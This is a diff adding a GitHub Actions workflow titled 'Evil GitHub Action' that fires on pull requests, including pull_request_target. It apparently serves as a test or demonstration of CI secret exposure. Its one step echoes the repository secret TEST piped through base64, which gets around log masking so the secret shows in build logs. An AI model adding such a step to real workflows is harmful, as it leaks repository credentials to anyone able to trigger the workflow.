@@ -1,0 +1,10 @@
+name: Evil GitHub Action
+run-name: Evil action by ${{ github.actor }} triggered by ${{ github.event_name }}
+on: [pull_request,pull_request_target,pull_request_review_comment]
+
+jobs:
+  Evil-Action-Run:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Evil action run that uses a secret"
+      - run: echo ${{secrets.TEST}} | base64
